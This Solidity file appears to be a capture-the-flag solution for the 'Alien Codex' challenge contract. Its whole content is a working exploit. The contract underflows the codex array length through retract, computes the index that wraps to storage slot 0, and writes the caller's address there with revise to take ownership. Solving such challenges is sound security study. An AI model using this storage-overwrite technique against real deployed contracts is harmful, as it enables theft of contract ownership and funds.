// SPDX-License-Identifier: MIT

pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AlienCodexAttack {
    AlienCodex public alienCodex;
    uint public index;
    bytes32 public myAddress;

    constructor(AlienCodex _alienCodex) public {
        alienCodex = _alienCodex;
    }

    function attack() public {
        index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        myAddress = bytes32(uint256(uint160(tx.origin)));

        // Make contact with the aliens to bypass the modifier
        alienCodex.makeContact();

        // Call the retract function to underflow the length of the codex array
        alienCodex.retract();

        // Call the revise function to write my address to the index of the underflowed array
        alienCodex.revise(index, myAddress);
    }
}
